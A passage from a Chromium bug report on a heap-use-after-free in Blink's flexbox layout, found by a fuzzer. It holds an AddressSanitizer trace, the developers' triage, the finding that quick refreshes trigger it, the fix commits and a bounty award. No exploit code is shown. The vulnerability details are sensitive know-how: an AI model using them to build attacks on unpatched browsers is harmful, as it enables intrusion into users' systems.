#17 0x55d647a2741f in RunInternal third\_party/blink/renderer/platform/wtf/functional.h:264:33  

#18 0x55d647a2741f in WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::Run() third\_party/blink/renderer/platform/wtf/functional.h:249:12  

#19 0x55d64b5ed532 in Run base/callback.h:99:12  

#20 0x55d64b5ed532 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:142:33  

#21 0x55d64b64134c in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:184:23  

#22 0x55d64b645182 in void base::internal::FunctorTraits<void (base::sequence\_manager::internal::ThreadControllerImpl::\*)(base::sequence\_manager::internal::ThreadControllerImpl::WorkType), void>::Invoke<void (base::sequence\_manager::internal::ThreadControllerImpl::\*)(base::sequence\_manager::internal::ThreadControllerImpl::WorkType), base::WeakPtr[base::sequence\_manager::internal::ThreadControllerImpl](javascript:void(0);) const&, base::sequence\_manager::internal::ThreadControllerImpl::WorkType const&>(void (base::sequence\_manager::internal::ThreadControllerImpl::\*)(base::sequence\_manager::internal::ThreadControllerImpl::WorkType), base::WeakPtr[base::sequence\_manager::internal::ThreadControllerImpl](javascript:void(0);) const&, base::sequence\_manager::internal::ThreadControllerImpl::WorkType const&) base/bind\_internal.h:498:12  

#23 0x55d64b5ed532 in Run base/callback.h:99:12  

#24 0x55d64b5ed532 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:142:33  

#25 0x55d64b648b12 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:333:23  

#26 0x55d64b6482cf in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:253:36  

#27 0x55d64b504463 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:55  

#28 0x55d64b64a217 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:452:12  

#29 0x55d64b58f388 in base::RunLoop::Run() base/run\_loop.cc:124:14  

#30 0x55d65b40e6cf in content::RenderViewTest::LoadHTMLWithUrlOverride(char const\*, char const\*) content/public/test/render\_view\_test.cc:336:10  

#31 0x55d640293669 in LoadHTML content/test/fuzzer/fuzzer\_support.h:27:21  

#32 0x55d640293669 in LLVMFuzzerTestOneInput content/test/fuzzer/renderer\_fuzzer.cc:22:17  

#33 0x55d640294c13 in main testing/libfuzzer/unittest\_main.cc:57:5  

#34 0x7fc62d871b96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

previously allocated by thread T0 here:  

#0 0x55d64026703d in malloc /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cpp:145:3  

#1 0x55d65577e52b in AllocFlags base/allocator/partition\_allocator/partition\_alloc.h:773:48  

#2 0x55d65577e52b in Alloc base/allocator/partition\_allocator/partition\_alloc.h:843:10  

#3 0x55d65577e52b in blink::LayoutObject::operator new(unsigned long) third\_party/blink/renderer/core/layout/layout\_object.cc:190:46  

#4 0x55d654c38cfb in blink::HTMLPlugInElement::CreateLayoutObject(blink::ComputedStyle const&, blink::LegacyLayout) third\_party/blink/renderer/core/html/html\_plugin\_element.cc:348:10  

#5 0x55d653b80d9f in blink::LayoutTreeBuilderForElement::CreateLayoutObject() third\_party/blink/renderer/core/dom/layout\_tree\_builder.cc:86:44  

#6 0x55d653aa67b5 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2823:15  

#7 0x55d654c3671b in blink::HTMLPlugInElement::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/html/html\_plugin\_element.cc:201:26  

#8 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#9 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#10 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#11 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#12 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#13 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#14 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#15 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#16 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#17 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#18 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#19 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#20 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#21 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#22 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#23 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#24 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#25 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#26 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#27 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#28 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#29 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20  

#30 0x55d6538e3e46 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:1007:12  

#31 0x55d653aa6b10 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2857:20

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/blink/renderer/core/layout/layout\_block\_flow.h:1040:19 in AllowFrom  

Shadow bytes around the buggy address:  

0x0c247fffa0e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c247fffa0f0: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa  

0x0c247fffa100: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c247fffa110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c247fffa120: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa  

=>0x0c247fffa130: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd  

0x0c247fffa140: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c247fffa150: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa  

0x0c247fffa160: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c247fffa170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c247fffa180: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==13720==ABORTING

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Renata Hodovan  

This issue was found by the Grammarinator fuzzer.

## Attachments

- [test.html](attachments/test.html) (text/plain, 272 B)
- [a.html](attachments/a.html) (text/plain, 169 B)

## Timeline

### cl...@chromium.org (2020-07-06)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5654003158941696.

### ca...@chromium.org (2020-07-06)

It looks like Clusterfuzz was not able to reproduce this, but it does reproduce locally for me starting on 85

[Monorail components: Blink>Layout]

### ca...@chromium.org (2020-07-06)

cbiesinger: Can you PTAL and help further triage this? Thanks

### cb...@chromium.org (2020-07-06)

Seems like the kind of issue Koji has been working on

cc Ian, fyi

### ko...@chromium.org (2020-07-06)

I can't reproduce either on ToT.

Checked fixes after 86.0.4193.0 manually but they don't hit.

Most probable fixes by looking at the test case are r782445 85.0.4183.0 and r784303 86.0.4189.0, and their fixes do hit, so 85.0.4181.8 should crash, but both should be null-dereferencing, not use-after-free.

### ho...@gmail.com (2020-07-07)

I've just tested it on a fresh build with a chrome binary at 86.0.4195.0 (64cf0064494d35e48dcb9cf253e18b270fa58c57-refs/heads/master@{#785570}) and it still reproduces the UAF without any special runtime flags.

My build args:

is_debug = false
is_asan = true
dcheck_always_on = true
symbol_level = 1
blink_symbol_level = 1
enable_nacl = false
use_sanitizer_coverage = false
use_external_fuzzing_engine = true

### ko...@chromium.org (2020-07-07)

I cannot reproduce with the args.gn. Not sure what is happening, but since clusterfuzz cannot reproduce either, allow me to close. Please leave comments if you found any.

### ho...@gmail.com (2020-07-07)

@koji It's really weird since I can reproduce it 100% times all with chrome, content_shell and renderer_fuzzer on two different linux machines (Ubuntu 18.04 & 20.04). @carlosil mentioned that he could reproduce it locally, too.

Furthermore, it's also triggered by the latest official nightly chromium build available from https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/linux-debug%2Fasan-linux-debug-785639.zip?generation=1594116898961094&alt=media . Could you try to execute with that binary please? Although I didn't need it, but could you please try a refresh after loading the test file?

### ko...@chromium.org (2020-07-07)

https://crbug.com/chromium/1102151#c8: Thank you for the info, "refresh" is the key. I can reproduce by clicking "Refresh" button a few times quickly.

A few observations:
* Reproduces with our without FragmentItem.
* Added:
    DCHECK(!GetLayoutObject()->BeginDestroyed());
  to NGPhysicalFragment::PostLayout(), right before `DynamicTo`, but this DCHECK does not hit.
  Maybe the memory is already broken.
* Does not reproduce with --disable-blink-features=LayoutNGFlexbox (though outline is a bit broken)

dgrogan@, can you take a look?

### [Deleted User] (2020-07-08)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-07-08)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dg...@chromium.org (2020-07-08)

I will look.

### [Deleted User] (2020-07-15)

[Empty comment from Monorail migration]

### dg...@chromium.org (2020-07-17)

This is funky.

https://chromium-review.googlesource.com/c/chromium/src/+/2219312 by chrishtr turned the attached repro into a nullptr crash.
https://chromium-review.googlesource.com/c/chromium/src/+/2275944 by kojii fixed the crash but revealed (maybe introduced?) the use-after-free.

I'm punting to chrishtr for now based on the first CL.

### ko...@chromium.org (2020-07-17)

Thank you David for the great analysis, I think I understand this now.

The root problem is https://crbug.com/chromium/965639. We work around the problem by adding the "PostLayout", but it only supported |LayoutBlockFlow|. crrev.com/c/2219312 made the problem possible for other objects, but |LayoutNGFlexibleBox| is probably the first non-|LayoutBlockFlow| object laid out by NG.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4b773ef1c609dc4826384c6d933d5527403db080

commit 4b773ef1c609dc4826384c6d933d5527403db080
Author: Koji Ishii <kojii@chromium.org>
Date: Fri Jul 17 21:40:35 2020

Apply |PostLayout| to |LayoutBox| instead of |LayoutBlockFlow|

|PostLayout| was limited to |LayoutBlockFlow| because
crbug.com/965639 could happen only to|LayoutBlockFlow|,
but following conditions have changed:

* Only |LayoutBlockFlow| could be relayout boundary, until
  r772560 <crrev.com/c/2219312>.
* Only |LayoutBlockFlow| was laid out by LayoutNG, until
  |LayoutNGFlexibleBox| inherits from |LayoutBlock|.

This patch changes |PostLayout| to work for |LayoutBox|.

In doing so, two changes were made:
1. |CurrentFragment| is replaced with |GetPhysicalFragment|
   because the former is not available for |LayoutBox|.
2. Stopped checking |IsRelayoutBoundary|. Though it is the
   only case crbug.com/965639 can happen as far as we're
   aware of, checking |NGPhysicalFragment| is more
   essential and sufficient.

The change 1 also helps <crbug.com/1061423>, but we may need
different approach to support block fragmentation.

Bug: 1102151, 965639
Change-Id: Id83be614066392a4c58c8b03bd16ee57ad82e145
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2302984
Reviewed-by: David Grogan <dgrogan@chromium.org>
Reviewed-by: Ian Kilpatrick <ikilpatrick@chromium.org>
Commit-Queue: Koji Ishii <kojii@chromium.org>
Cr-Commit-Position: refs/heads/master@{#789656}

[modify] https://crrev.com/4b773ef1c609dc4826384c6d933d5527403db080/third_party/blink/renderer/core/layout/ng/ng_physical_fragment.cc
[add] https://crrev.com/4b773ef1c609dc4826384c6d933d5527403db080/third_party/blink/web_tests/external/wpt/css/css-contain/contain-flexbox-outline.html


### ko...@chromium.org (2020-07-20)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-07-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-21)

Your change meets the bar and is auto-approved for M85. Please go ahead and merge the CL to branch 4183 (refs/branch-heads/4183) manually. Please contact milestone owner if you have questions.
Merge instructions: https://www.chromium.org/developers/how-tos/drover
Owners: benmason@(Android), bindusuvarna@(iOS), dgagnon@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/530456c54de0c5d8561bd8ddcc78deea3be8fa78

commit 530456c54de0c5d8561bd8ddcc78deea3be8fa78
Author: Koji Ishii <kojii@chromium.org>
Date: Tue Jul 21 07:43:43 2020

Merge 4183: Apply |PostLayout| to |LayoutBox| instead of |LayoutBlockFlow|

Note: 3 DCHECKs were removed by manual merges:
* One uses a function only in M86.
* Two are known to hit (crbug.com/1107204).

|PostLayout| was limited to |LayoutBlockFlow| because
crbug.com/965639 could happen only to|LayoutBlockFlow|,
but following conditions have changed:

* Only |LayoutBlockFlow| could be relayout boundary, until
  r772560 <crrev.com/c/2219312>.
* Only |LayoutBlockFlow| was laid out by LayoutNG, until
  |LayoutNGFlexibleBox| inherits from |LayoutBlock|.

This patch changes |PostLayout| to work for |LayoutBox|.

In doing so, two changes were made:
1. |CurrentFragment| is replaced with |GetPhysicalFragment|
   because the former is not available for |LayoutBox|.
2. Stopped checking |IsRelayoutBoundary|. Though it is the
   only case crbug.com/965639 can happen as far as we're
   aware of, checking |NGPhysicalFragment| is more
   essential and sufficient.

The change 1 also helps <crbug.com/1061423>, but we may need
different approach to support block fragmentation.

(cherry picked from commit 4b773ef1c609dc4826384c6d933d5527403db080)

Bug: 1102151, 965639
Change-Id: Id83be614066392a4c58c8b03bd16ee57ad82e145
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2302984
Reviewed-by: David Grogan <dgrogan@chromium.org>
Reviewed-by: Ian Kilpatrick <ikilpatrick@chromium.org>
Commit-Queue: Koji Ishii <kojii@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#789656}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2308617
Reviewed-by: Koji Ishii <kojii@chromium.org>
Cr-Commit-Position: refs/branch-heads/4183@{#785}
Cr-Branched-From: 740e9e8a40505392ba5c8e022a8024b3d018ca65-refs/heads/master@{#782793}

[modify] https://crrev.com/530456c54de0c5d8561bd8ddcc78deea3be8fa78/third_party/blink/renderer/core/layout/ng/ng_physical_fragment.cc
[add] https://crrev.com/530456c54de0c5d8561bd8ddcc78deea3be8fa78/third_party/blink/web_tests/external/wpt/css/css-contain/contain-flexbox-outline.html


### mm...@chromium.org (2020-07-21)

kojii@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### ad...@google.com (2020-07-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-07-23)

Congratulations! The VRP panel has awarded $5000 for this report.

### ad...@google.com (2020-07-23)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-08-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-26)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-10-26)

This issue was migrated from crbug.com/chromium/1102151?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052773)*
